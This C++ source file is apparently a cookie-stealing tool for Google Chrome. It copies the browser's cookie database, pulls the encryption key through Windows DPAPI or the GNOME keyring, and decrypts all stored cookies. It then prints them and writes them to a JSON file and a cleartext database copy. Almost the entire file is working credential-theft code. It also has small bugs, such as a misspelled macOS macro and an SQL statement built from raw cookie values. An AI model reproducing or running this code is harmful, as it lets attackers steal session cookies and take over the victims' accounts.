#include <filesystem>
#include <tuple>
#include <vector>
#include <list>
#include <string>
#include <iostream> 
#include <memory>

#include <sqlite3.h>
#include <jsoncons/json.hpp>
#include <fstream>

#ifdef _WIN32
    #include "base64.hpp"
    #include <Windows.h>
    #include <Lmcons.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment (lib, "crypt32")
    #define ITERATION     1 
#elif __APPLE_
    #define ITERATION     1003 
#elif __linux__
    #define ITERATION     1 
    #include <libsecret/secret.h>
    #include <string>
    #include <list>
#endif // _WIN32


#include <openssl/evp.h>
#include <openssl/aes.h>

#define KEY_LEN      16

#ifdef _WIN32
// old "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
#define CHROME_COOKIES_PATH "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
#elif __APPLE_
#define CHROME_COOKIES_PATH "%s/Library/Application Support/Google/Chrome/Default/Cookies"
#elif __linux__
#define CHROME_COOKIES_PATH "%s/.config/google-chrome/Default/Cookies"
#endif //_WIN32

static bool quiet = false;

using cookie_vector_t = std::vector<std::tuple<std::string, std::string, std::vector<unsigned char>, std::string>>;

cookie_vector_t get_encrypted_cookies_vector(const char* db_path) {
    
    sqlite3* DB;
    auto sol_vector = cookie_vector_t();

    if (sqlite3_open_v2(db_path, &DB, SQLITE_OPEN_READONLY, NULL)) {
        std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
        exit(-1);
    }
    else
        std::cout << "Opened Database Successfully!" << std::endl;
    
    sqlite3_stmt* statement;

    const char* sql = "SELECT host_key, name, encrypted_value from cookies;";
    auto a = sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0);
    if (sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0) != SQLITE_OK)
    {
        printf("Open database failed\n");
        exit(-1);
    }

    int result = 0;
    while (true)
    {
        result = sqlite3_step(statement);

        if (result == SQLITE_ROW)
        {
            const char* host_key = (const char*)sqlite3_column_text(statement, 0);
            const char* cookie_name = (const char*)sqlite3_column_text(statement, 1);

            // Get the size of the vector
            int size = sqlite3_column_bytes(statement, 2);
            if (size == 0)
                continue;

            // Get the pointer to data
            unsigned char* p = (unsigned char*)sqlite3_column_blob(statement, 2);

            // Initialize the vector with the data
            std::vector<unsigned char> encrypted_value(p, p + size);

            std::string signature(encrypted_value.begin(), encrypted_value.begin() + 3);
            if (signature == "v10" || signature == "v11") {
                encrypted_value.erase(encrypted_value.begin(), encrypted_value.begin() + 3);
                sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
            }
            else {
                std::cout << "[!] Encrypted cookies does not have v10 or v11 magic header" << std::endl;
            }

        }
        else
        {
            break;
        }
    }

    sqlite3_finalize(statement);
    sqlite3_close(DB);
    return sol_vector;
}



#ifdef __linux__
std::list<std::string> name_values_;
void Append(GHashTable* attrs_, const std::string& name, const std::string& value) {
    name_values_.push_back(name);
    gpointer name_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    name_values_.push_back(value);
    gpointer value_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    g_hash_table_insert(attrs_, name_str, value_str);
}


SecretValue* ToSingleSecret(GList* secret_items) {
    GList* first = g_list_first(secret_items);
    if (first == nullptr)
        return nullptr;
    if (g_list_next(first) != nullptr) {
        //std::cout << "OSCrypt found more than one encryption keys.";
    }
    SecretItem* secret_item = static_cast<SecretItem*>(first->data);
    SecretValue* secret_value = secret_item_get_secret(secret_item);
    return secret_value;
}
#endif


void aes_init()
{
    static int init = 0;
    if (init == 0)
    {
        //EVP_CIPHER_CTX e_ctx, d_ctx;

        //initialize openssl ciphers
        OpenSSL_add_all_ciphers();
    }
}

std::string aes_256_gcm_decrypt(std::vector<unsigned char> ciphertext, std::string key)
{

    constexpr size_t kNonceLength = 12;

    unsigned char tag[AES_BLOCK_SIZE];
    unsigned char nonce[kNonceLength];

    std::copy(ciphertext.begin(), ciphertext.begin() + 12, nonce);
    std::copy(ciphertext.end() - 16, ciphertext.end(), tag);

    std::vector<unsigned char> plaintext;
    plaintext.resize(ciphertext.size(), '\0');

    int actual_size = 0, final_size = 0;
    EVP_CIPHER_CTX* d_ctx = EVP_CIPHER_CTX_new();
    auto a = EVP_DecryptInit(d_ctx, EVP_aes_256_gcm(), (const unsigned char*)key.c_str(), nonce);
    auto b = EVP_DecryptUpdate(d_ctx, &plaintext[0], &actual_size, &ciphertext[kNonceLength], ciphertext.size()  - sizeof(tag) - sizeof(nonce));
    auto c = EVP_CIPHER_CTX_ctrl(d_ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);
    if (!EVP_DecryptFinal(d_ctx, &plaintext[actual_size], &final_size)) {
        std::cout << "[!] Error decrypting cookie" << std::endl;
    }
    EVP_CIPHER_CTX_free(d_ctx);
    plaintext.resize(actual_size + final_size, '\0');

    return std::string(plaintext.begin(), plaintext.end());
}


#ifndef _WIN32
string derive_key(string pwd)
{
    size_t i;
    string ret = "";
    unsigned char* out;
    unsigned char salt_value[] = { 's', 'a', 'l', 't', 'y', 's' , 'a', 'l', 't' };

    out = (unsigned char*)malloc(sizeof(unsigned char) * KEY_LEN);

    printf("pass: %s\n", pwd.c_str());
    printf("ITERATION: %u\n", ITERATION);
    printf("salt: "); for (i = 0; i < sizeof(salt_value); i++) { printf("%02x", salt_value[i]); } printf("\n");

    if (PKCS5_PBKDF2_HMAC_SHA1(pwd.c_str(), pwd.size(), salt_value, sizeof(salt_value), ITERATION, KEY_LEN, out) != 0)
    {
        printf("out: "); for (i = 0; i < KEY_LEN; i++) { printf("%02x", out[i]); } printf("\n");
        ret = string((char*)out, KEY_LEN);
    }
    else
    {
        fprintf(stderr, "PKCS5_PBKDF2_HMAC_SHA1 failed\n");
    }

    free(out);

    return ret;
}

std::string AES_Decrypt_String(std::string const& data, std::string const& key, std::vector<unsigned char> const& iVec)
{
    if (data.empty() || key.empty())
        return data;

    unsigned char decryptionIvec[AES_BLOCK_SIZE];
    memcpy(decryptionIvec, &iVec[0], AES_BLOCK_SIZE);

    AES_KEY AESkey;
    AES_set_decrypt_key((unsigned const char*)key.c_str(), key.size() * 8, &AESkey);
    unsigned char buffer[AES_BLOCK_SIZE];
    std::string value;

    for (unsigned int i = 0; i < data.size(); i += AES_BLOCK_SIZE)
    {
        AES_cbc_encrypt((unsigned const char*)data.c_str() + i, buffer, AES_BLOCK_SIZE, &AESkey, decryptionIvec, AES_DECRYPT);
        value.resize(value.size() + AES_BLOCK_SIZE);
        memcpy(&value[i], buffer, AES_BLOCK_SIZE);
    }

    /* Clean Strip padding from decrypted value.
     Remove number indicated by padding
         e.g. if last is '\x0e' then ord('\x0e') == 14, so take off 14. */

    return value.erase(value.size() - (int)value.back());
}
#endif

std::string get_key() {
#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    char cookies_path[MAX_PATH] = { 0 };
    //snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", username);
    snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", username);
    //"C:\Users\defaul\AppData\Local\Google\Chrome\User Data\Local State"
    std::ifstream is(cookies_path);
    
    if (!is.is_open()) {
        std::cout << "Error opening " << cookies_path << std::endl;
        return "";
    }
    
    try
    {
        jsoncons::json j = jsoncons::json::parse(is);
        auto encrypted_key = j["os_crypt"]["encrypted_key"].as<std::string>();
        
        auto decoded = base64_decode(encrypted_key);
        decoded.erase(decoded.begin(), decoded.begin() + 5);

        DATA_BLOB input;
        std::string plaintext;
        input.pbData = const_cast<BYTE*>(
            reinterpret_cast<const BYTE*>(decoded.data()));
        input.cbData = static_cast<DWORD>(decoded.size());

        DATA_BLOB output;
        if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
            0, &output)) {
            std::cout << "[!] CryptUnprotectData failed decrypting encrypted_key" << std::endl;
            return "";
        }
        return std::string(reinterpret_cast<char*>(output.pbData), output.cbData);

    }
    catch (const jsoncons::ser_error& e)
    {
        std::cout << e.what() << std::endl;
        return "";
    }
    

#elif __APPLE_

#elif __linux__
    const SecretSchema kKeystoreSchemaV2 = {
        "chrome_libsecret_os_crypt_password_v2",
        SECRET_SCHEMA_DONT_MATCH_NAME,
        {
            {"application", SECRET_SCHEMA_ATTRIBUTE_STRING},
            {nullptr, SECRET_SCHEMA_ATTRIBUTE_STRING},
        }
    };

    GHashTable* attrs;
    attrs = g_hash_table_new_full(g_str_hash, g_str_equal,
        nullptr,   // no deleter for keys
        nullptr);  // no deleter for values
    Append(attrs, "application", "chrome");

    GError* error_ = nullptr;

    GList* results_ = nullptr;
    results_ = secret_service_search_sync(nullptr,  // default secret service
        &kKeystoreSchemaV2, attrs, static_cast<SecretSearchFlags>(SECRET_SEARCH_UNLOCK | SECRET_SEARCH_LOAD_SECRETS),
        nullptr,  // no cancellable object
        &error_);

    SecretValue * password_libsecret = ToSingleSecret(results_);
    if (password_libsecret == nullptr) {
        std::cout < "[!] Error accessing gnome keyring. Is the user logged in (check who)?\n" << std::endl;
        return "";
    }


    std::string key(secret_value_get_text(password_libsecret));

    printf("The Key is %s\n", key.c_str());

    // Derive key to get encryption key
    //auto derived_key = derive_key(key);
    auto derived_key = derive_key(key);

    if (derived_key.empty()) {
        // error
        return;
    }
    return derived_key;
    
#endif
    return "";
}

std::string decryptCookie(std::vector<unsigned char> ciphertext, std::string encryptionKey) {
#ifdef _WIN32
    return aes_256_gcm_decrypt(ciphertext, encryptionKey);
#else
    return AES_Decrypt_String(std::string(ciphertext.begin(), ciphertext.end()), encryptionKey, std::vector<unsigned char>(AES_BLOCK_SIZE, 0x20));
#endif
}

void decrypt_cookies(cookie_vector_t* cookie_vector)
{
    jsoncons::json allCookies(jsoncons::json_array_arg);

    // Get key. This is OS dependent
    auto encryptionKey = get_key();
    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
        decrypted_value = decryptCookie(encrypted_value, encryptionKey);
        
        jsoncons::json cookieJSON;
        cookieJSON["domain"] = host_key;
        cookieJSON["name"] = cookie_name;
        cookieJSON["value"] = decrypted_value;
        allCookies.push_back(std::move(cookieJSON));
    }

    if (!quiet) {
        std::cout << jsoncons::pretty_print(allCookies) << std::endl;
    }
    
    std::ofstream fsi("test.json");
    allCookies.dump_pretty(fsi);
    fsi.close(); 
    
}


int update_decrypted_DB(cookie_vector_t cookie_vector, char* db_path) {
    sqlite3* DB;
    
    char sql[4000];

    int exit = 0;
    exit = sqlite3_open(db_path, &DB);
    char* zErrMsg = 0;

    if (exit) {
        std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
        return -1;
    }
    else
        std::cout << "Updating DB rows with decrypted values. This may take a while..." << std::endl;

    /* Create merged SQL statement */
    auto format = "UPDATE cookies SET encrypted_value = '%s' where host_key='%s' AND name='%s'";

    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : cookie_vector) {
        snprintf(sql, sizeof(sql), format, decrypted_value.c_str(), host_key.c_str(), cookie_name.c_str());

        auto rc = sqlite3_exec(DB, sql, NULL, NULL, &zErrMsg);
    }

    return 0;
}


int main(int argc, char** argv) {
    if (argc > 2 && strstr(argv[1], "-q") == 0) {
        quiet = true;
    }

#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    char cookies_path[MAX_PATH] = {0};
    snprintf(cookies_path, MAX_PATH, CHROME_COOKIES_PATH, username);
#else
    char cookies_path[PATH_MAX] = {0};
    auto home = getenv("HOME");
    snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, home);
#endif //_WIN32

    std::error_code err;
    std::filesystem::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing, err);

    if (err) {
        std::cout << err.message() << std::endl;
        return -1;
    }

    auto cookies_vector = get_encrypted_cookies_vector("Cookies_decrypted");
    
    if (cookies_vector.empty()) {
        std::cout << "[!] Couldn't get cookies values" << std::endl;
        return -1;
    }

    decrypt_cookies(&cookies_vector);

    // Update Cookies_decrypted with the decrypted values of the cookies
    if (update_decrypted_DB(cookies_vector, "Cookies_decrypted") == 0) {
        std::cout << "Database has been properly created with decrypted values" << std::endl;
    }
    else {
        std::cout << "[!!] Some error occured while creating cleartext Cookies DB" << std::endl;
        return -1;
    }

    return 0;
}